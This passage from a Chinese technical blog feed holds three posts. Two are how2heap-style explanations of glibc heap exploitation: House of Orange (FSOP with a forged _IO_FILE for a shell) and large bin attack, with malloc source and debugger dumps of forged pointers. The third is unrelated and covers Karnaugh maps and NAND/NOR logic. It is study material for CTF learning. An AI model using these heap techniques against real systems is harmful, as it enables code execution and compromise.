class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来，将chunk的size改为0x61，将chunk的bk指针赋值为<code>_IO_list_all-0x10</code>，对应<code>chunk-&gt;bk-&gt;fd</code>。</p><p><img src="https://img-blog.csdnimg.cn/c307e3c2e9c14240b7f8b33d57b52698.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQWdDbOKGkQ==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p>然后将chunk地址看成一个假的<code>_IO_FILE</code>结构体指针fp，但是在最前面写上’&#x2F;bin&#x2F;sh\x00’。将fp-&gt;_mode设为0（偏移为0xC0）【这里的_mode我看了半天才明白原来不应该忽略#ifdef，如果为假则_IO_FILE中有_mode这个元素】、fp-&gt;_IO_write_base设为2、fp-&gt;_IO_write_ptr设为3、fp的jump_table处索引为3（偏移为0x78）设为shell函数地址。最后调用malloc出错，打印错误信息后拿到shell。</p><p>_int_malloc中通不过的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>看到这里，虽然整个流程走完了，但还是不禁要问一句，他为什么要这样设定？为什么要改变这些地址？将2016年此方法诞生的那道题——HITCON CTF 2016 House of Orange的解析看完后，便明白了。</p><ol><li>要在遍历_IO_list_all时拿到shell，所以应该让这个指针指向我们可以控制的内存区域，也就是这个被释放的老top chunk。那既然要遍历_IO_list_all，为什么源码中没有修改这里的值，让其指向old top chunk？</li></ol><blockquote><p>在源码中并没有直接对_IO_list_all中的值进行修改，它是在最后一次调用malloc函数时libc修改的。可以想想如果我们自己写一个双向链表的脱链操作，要将链表中的第一个元素脱链，就必然要在脱链之后将头指针指向原来链表中的第二个元素。因此最后的malloc(0x10)中，libc检查了老top chunk后会将其从unsorted bin中拿出来，之后old top chunk的bk指针指向的(_IO_list_all-0x10)-&gt;fd就会被成功修改，而(_IO_list_all-0x10)-&gt;fd &#x3D;&#x3D; _IO_list_all。所以这里是在最后被修改的。实际上，这是一种unsorted bin attack。整个攻击流程实际上是unsorted bin attack与FSOP的结合。</p></blockquote><ol start="2"><li>这里为什么要将unsorted bin的size改为0x61？</li></ol><blockquote><p><font color=red>注意：malloc函数查找bins的顺序是：fastbins、small bins、unsorted bin、large bins。在搜索unsorted bin时，除分配small bins大小的chunk有时会进行拆分之外，与搜索fastbins相同，返回大小与请求大小正好相等的chunk，其他的chunk会根据大小链入small bins和large bins中。</font>这里将size改为0x61，是为了在malloc时将其链入到smallbins[5]中。在arena的控制结构体中，fastbins的地址在最前面，之后是其他bins的地址，都在一个数组bins中，bins[0]、bins[1]分别为unsorted bin的头指针和尾指针；bins[2]、bins[3]为存放大小为0x20的chunk的small bin的头指针和尾指针……bins[10]、bins[11]就是为存放大小为0x60的chunk的small bin的头指针和尾指针，这也是第5个smallbin。之前_int_malloc函数已经将_IO_list_all修改为top chunk，那么在内存检查失败后会到达top chunk的地方，误认为这是一个_IO_FILE结构体。<br><font color=red>这里需要注意_IO_list_all被修改后的值。_IO_list_all是被修改为了unsorted bin头指针，即bins[0]的地址main_arena + 0x58，而不是top chunk的地址。因此，libc实际上会将main_arena + 0x58作为一个_IO_list_all结构体的头部。</font><br>那么要想让libc遍历到top chunk里面去，还要在后面再链接一个指针指向top chunk。在_IO_FILE结构体中0x68偏移指向的是_IO_FILE* chain，即下一个元素的指针。遍历到一个_IO_FILE_plus时，会执行vtable中的函数。下面是vtable的结构体定义。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>要执行的函数是第4个，因此源码中修改索引为3的值为后门函数。vtable紧跟在_IO_FILE结构体后面，因此也是可以控制的地址。</p><ol start="3"><li>为什么要设置_mode&#x3D;0，fp-&gt;_IO_write_base&#x3D;2、fp-&gt;_IO_write_ptr&#x3D;3？</li></ol><blockquote><p>执行_IO_OVERFLOW函数的是_IO_flush_all_lockp函数，其中调用_IO_OVERFLOW的语句如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure><blockquote><p>由此可知需要绕过一个检查，即<code>(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</code>，这也就不难理解了。只有绕过它才能执行_IO_OVERFLOW函数。</p></blockquote><p>总结一下，整个攻击流程大致有这么几步：</p><ul><li>不使用free函数获得一个unsorted bin中的chunk，同时泄露libc的基地址</li><li>构造chunk的结构准备攻击，包括绕过检查、设置system地址到指定地址</li><li>用malloc函数触发攻击</li></ul><p>到这里，House of orange的神秘面纱算是彻底揭开了。能够真正理解这个攻击，我们的水平就又提升了一个档次。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数字逻辑 个人总结——电路设计表达式变形总结</title>
      <link href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94%E7%94%B5%E8%B7%AF%E8%AE%BE%E8%AE%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8F%98%E5%BD%A2%E6%80%BB%E7%BB%93/"/>
      <url>/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94%E7%94%B5%E8%B7%AF%E8%AE%BE%E8%AE%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8F%98%E5%BD%A2%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>在电路设计中，最直观的方式是与或表达式，但有时这种方式所需的逻辑门电路较多。有时可以对其加以变形。在变形的过程中，通过画出卡诺图能够让我们更加直观地理解其中的变化过程。</p><ol><li>或与表达式</li></ol><p>画出卡诺图，圈出0的部分，直接写出或与表达式。</p><p><strong>例1</strong></p><table><thead><tr><th align="center">CD\AB</th><th align="center">00</th><th align="center">01</th><th align="center">11</th><th align="center">10</th></tr></thead><tbody><tr><td align="center">00</td><td align="center">0</td><td align="center">0</td><td align="center">0</td><td align="center">0</td></tr><tr><td align="center">01</td><td align="center">0</td><td align="center">1</td><td align="center">1</td><td align="center">1</td></tr><tr><td align="center">11</td><td align="center">0</td><td align="center">0</td><td align="center">1</td><td align="center">1</td></tr><tr><td align="center">10</td><td align="center">0</td><td align="center">0</td><td align="center">1</td><td align="center">1</td></tr></tbody></table><p>Step 1: 画出0部分的划分圈</p><p><img src="https://img-blog.csdnimg.cn/083f490e02b44130b652595f1a2976d9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>红圈实际表示的是$\overline C * \overline D$，在或与表达式中写为$C + D$<br>绿圈实际表示的是$\overline A * \overline B$，在或与表达式中写为$A + B$<br>蓝圈实际表示的是$\overline A * C$，在或与表达式中写为$A + \overline C$</p><p>上述卡诺图对应的或与表达式就为：$(C+D)(A+B)(A+\overline C)$</p><ol start="2"><li>与非表达式</li></ol><p>将与非表达式以电路的形式展现时，电路中只能有与非门这一种门电路。对于每一个与非表达式，其最外面一定是一个非，在非的下面是多个与非表达式的与。这些与非表达式相与的结果应该对应卡诺图中0的部分，也即这里面任何一个与非表达式都应该包含0的所有部分。也即这里面任何一个与非表达式中非下面的部分都不应该包含0的任何部分。这样我们就转化成对1的部分进行分片的操作了。</p><p><strong>例2</strong></p><p>卡诺图与例1相同，可以将1分为以下3块。</p><p><img src="https://img-blog.csdnimg.cn/fc8d02ed738a47859f6bad588391c207.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>红圈实际表示的是$A * C$，在与非表达式中写为 $\overline{A * C}$<br>绿圈实际表示的是$B * \overline C * D$，在与非表达式中写为$\overline {B * \overline C * D}$<br>蓝圈实际表示的是$A * D$，在与非表达式中写为$\overline {A * D}$</p><p>上述卡诺图对应的与非表达式就为：$\overline {\overline {A * C} * \overline {B * \overline C * D} * \overline {A * D}}$。它实际上可以由与或表达式加两条杠转化而成，因此根据卡诺图求与非表达式实际上就是求与或表达式，非常方便。</p><p>如果要求出花费与非门最少的表达式，则需要关注0部分，为0部分画卡诺圈，这些圈都可以作为共同项写入每一个与非项中。如上例中可以写成$\overline{\overline{\overline{CD}\cdot\overline{A\overline C}A}\cdot\overline{\overline{CD}\cdot\overline{A\overline C}B}}$，这样需要5个与非门，与例2中需要的与非门数量相同。</p><ol start="3"><li>或非表达式</li></ol><p>使用与非表达式同样的方法进行分析：或非表达式的总的非下面有很多或非表达式的或，他们的或对应所有0的部分。因此其中每一个或非表达式都不能包含任何1的部分，也即其中每一个或非表达式中非的下面都应该包含所有1的部分。这样看来，或非表达式实际上是或与表达式加两条杠转化而来。</p><p><strong>例3</strong></p><p>卡诺图与例1相同，划分也与例1相同。</p><p>红圈实际表示的是$\overline C * \overline D$，在或与表达式中写为$\overline {\overline C + \overline D}$<br>绿圈实际表示的是$\overline A * \overline B$，在或与表达式中写为$\overline {\overline A + \overline B}$<br>蓝圈实际表示的是$\overline A * C$，在或与表达式中写为$\overline {\overline A + C}$</p><p>上述卡诺图对应的或非表达式就为：$\overline{\overline {\overline C + \overline D}+\overline {\overline A + \overline B}+\overline {\overline A + C}}$</p><ol start="4"><li>不含反变量的与非表达式</li></ol><p>如果与非表达式中可以有反变量，则不会产生嵌套，否则可能需要进行嵌套。</p><p>我们直接分析例子，一边分析一边总结规律。</p><p><strong>例4</strong></p><p>卡诺图同例1。</p><p>设表达式为$\overline X$，其中$X$是一系列与非表达式的与。则$X$表示的是图中所有0的部分。所有的与非项都应包含所有0部分。<br>其中，$\overline {AD}$和$\overline {CD}$仍然可用，这与例2相同，但例2中的$\overline {B * \overline C * D}$不再可用，我们必须将内部的$\overline C$换掉。方法很简单，将$\overline {C}$改成$\overline {B<em>C</em>D}$即可。在具体设计电路的情景下，这里的$\overline {B<em>C</em>D}$也可以改成$\overline {B<em>C}$或$\overline {C</em>D}$，看如何修改使逻辑门电路的输出结果得到最大限度的复用。</p><p>因此，如果我们想要获得不含反变量的与非表达式，只需要将原来的反变量下添加与其相乘的正变量即可，且是否添加均可选，但不能都不选。</p><p>但是不难发现，上述方法产生的表达式至多只有两层嵌套，能否利用多层嵌套实现功能呢？</p><ol start="5"><li>高阶与非表达式探究（慎用！）<br>对于含有4个变量的形如$\overline{\overline{\overline {AB}C}D}$（3个与非门）的与非表达式（$A\ne B$），其需要3个与非门完成，等价于$\overline{\overline CD+ABD}$（4个与非门），使用代换规则可以在卡诺图中构造出类似于这样的很多表达式。当四个变量均不相同时，卡诺图中0的个数应为5。从与非表达式转换为与或表达式不如从与或表达式转换为与非表达式有用。如果题中明确采用与非表达式且要求使用的门电路最少，不妨可以考虑这种高阶与非表达式，有利于构造不规则卡诺图形状。观察到其转化后的与非项两项都有$D$，因此反带时可以将非反变量的共同项看成是$D$。但要注意，在$\overline C$和$AB$的选择上，有时两项除共同项外无法直接配出这两项，这时不适合使用高阶表达式，直接采用第四点中的表达式即可。</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>how2heap 深入学习(8)</title>
      <link href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-8/"/>
      <url>/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-8/</url>
      
        <content type="html"><![CDATA[<p>how2heap下载网址: <a href="https://github.com/shellphish/how2heap">传送门</a><br>Glibc源码查看网址：<a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3516">传送门</a><br>参考书籍：CTF竞赛权威指南-pwn篇</p><p>测试环境：Ubuntu 18.04<br>Glibc 版本：Ubuntu GLIBC 2.27-3ubuntu1.5</p><p>按照顺序，本文将分析glibc 2.27文件夹下的第9~16个源码，重点对源码进行分析与解读。一些2.23版本中出现过的漏洞将不再赘述。<br>如果本文的分析有任何错漏之处，还请各位读者不吝赐教，不胜感激。</p><h1 id="9-large-bin-attack"><a href="#9-large-bin-attack" class="headerlink" title="9. large_bin_attack"></a>9. large_bin_attack</h1><p>简单看了一下源码，和2.23版本的没有什么区别，有关于large bin的链入过程已经在上一篇文章详细推演过了，这里解释一下large bin attack的大致操作流程。</p><p><strong>Step 1: 构造堆环境</strong></p><p>在分配3块大内存后释放前2块之后，unsorted bin中有2个chunk。</p><p>之后，会分配一个0x100大小的堆块，由于last_remainder始终为空，因此这会导致两个unsorted bin中的chunk首先被链入到large bins中。</p><p>到此为止，_int_malloc函数仍然没有找到能够分配给用户的chunk，那么下一步就是在large bins中寻找并切割chunk，这也是last_remainder从NULL被赋值为一个有效地址的唯一方式。下面就来具体分析一下这个子过程。</p><h2 id="切割large-bins-chunk返回的过程"><a href="#切割large-bins-chunk返回的过程" class="headerlink" title="切割large bins chunk返回的过程"></a>切割large bins chunk返回的过程</h2><p>下面是这个子过程的源码，在第4步大循环中执行。第4步大循环首先进入一个while小循环将unsorted bin整理完毕，然后再向下执行，到达这个子过程。中间跳过了一个检查是否分配的是大chunk的过程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">++idx;</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line">block = idx2block (idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">              <span class="keyword">goto</span> use_top;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">    <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        assert (bit != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">    victim = last (bin);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">    <span class="keyword">if</span> (victim == bin)</span><br><span class="line">      &#123;</span><br><span class="line">        av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">        assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* unlink */</span></span><br><span class="line">        unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, size);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">               have to perform a complete insert here.  */</span></span><br><span class="line">            bck = unsorted_chunks (av);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line">            remainder-&gt;bk = bck;</span><br><span class="line">            remainder-&gt;fd = fwd;</span><br><span class="line">            bck-&gt;fd = remainder;</span><br><span class="line">            fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">            <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">              &#123;</span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">            set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            set_foot (remainder, remainder_size);</span><br><span class="line">          &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在一开始，有block，map，bit这三个变量的赋值，这三个变量是干嘛的呢？注意在2.27的malloc_state中，第8个成员，也就是bins下面一个成员是一个叫binmap的东西，这个成员通过比特位来记录哪些bins当前存有chunk，哪些没有chunk，这是为了在后面查找chunk的时候不用每一个bin都过去检查是否为空。从下面的定义中可以看出，binmap是一个unsorted int类型，一个整型变量可以保存32个bin的“是否为空”的信息。那么一开始的<code>block = idx2block (idx);</code>就是为了找到对应索引（idx）的比特位信息在哪个索引中。<code>map = av-&gt;binmap[block];</code>则定位索引对应的无符号整型变量，<code>bit = idx2bit (idx);</code>则定位到该idx的比特位，从后面这句<code>while ((bit &amp; map) == 0)</code>可以看出，bit应该是诸如0x100，0x10000，0x1000000这样的数，与map做按位与处理判断某位上是否为1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSHIFT      5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)</span></span><br><span class="line">......</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br></pre></td></tr></table></figure><p>首先判断当前map中是否有满足请求大小的chunk，如果没有则查找下一个map，直至找到为止。如果都没有找到则通过top chunk分配。外层if判断条件为<code>bit &gt; map || bit == 0</code>，即当前map中没有满足的chunk或bit溢出，则查找后面的map，后面的map只要找到一个不为0的就说明有满足的chunk，就选择第一个非零的map。退出循环后while（line 4000）的条件为<code>(bit &amp; map) == 0</code>，即如果找到了chunk就确认bit并返回。<strong>（注意：执行到这一步时一定可以找到chunk，因为map非0且bit从1开始查找，所以才会有循环中的assert断言）</strong></p><p>找到有chunk的bin之后，选择最后一个chunk。后面再次检查这个bin是否为空（line 4011），如果为空说明前面的比特位有误，将其清除之后重新循环判断。</p><p>如果确认有chunk存在，选择最后一个chunk并获取其size，并断言这个size大于请求的size（line 4023）。计算切割该chunk后剩下的大小remainder_size。然后unlink将该chunk从bins中安全取出（line 4028）。</p><p>后面判断remainder_size是否小于最小chunk的size（0x20）。如果是则干脆将整个chunk全部分配出去，结束。（line 4031）</p><p>如果不是，将获取分割后的chunk的头部地址（line 4041），并将这个chunk插入到unsorted bin的头指针之后，也就是第一的位置（line 4049 ~ 4052）。之后如果申请大小在small bins范围则设置last_remainder为该chunk（line 4055），如果是large bin大小的chunk则将fd_nextsize和bk_nextsize置空（line 4057 ~ 4061）。之后设置一些标志位就可以返回了。</p><hr><p>根据上面的分析结果，可以知道，在两个chunk被链入到large bins之后，会选择较小的那个chunk，即p1进行切割，剩余大小为0x3f0。因此此次malloc之后将会有p1的残余留在unsorted bin，p2进入large bins。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x6032f0</span><br><span class="line">Size: 0x391</span><br><span class="line">fd: 0x7ffff7dcdca0</span><br><span class="line">bk: 0x7ffff7dcdca0</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x6036b0</span><br><span class="line">Size: 0x511</span><br><span class="line">fd: 0x7ffff7dce0d0</span><br><span class="line">bk: 0x7ffff7dce0d0</span><br><span class="line">fd_nextsize: 0x6036b0</span><br><span class="line">bk_nextsize: 0x6036b0</span><br></pre></td></tr></table></figure><p>后面释放p3，unsorted bin中就链入了两个chunk。</p><p><strong>Step 2: 修改p2的4个指针</strong></p><p>要修改的栈区地址为0x7fffffffe260~0x7fffffffe270。将p2的指针修改为如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00:0000│     0x6036b0 ◂— 0x0</span><br><span class="line">01:0008│     0x6036b8 ◂— 0x3f1// size改小</span><br><span class="line">02:0010│     0x6036c0 ◂— 0x0// fd置空</span><br><span class="line">03:0018│     0x6036c8 —▸ 0x7fffffffe250 —▸ 0x7fffffffe370 ◂— 0x1// bk设为target_addr - 0x10</span><br><span class="line">04:0020│     0x6036d0 ◂— 0x0// fd_nextsize置空</span><br><span class="line">05:0028│ rdx 0x6036d8 —▸ 0x7fffffffe248 —▸ 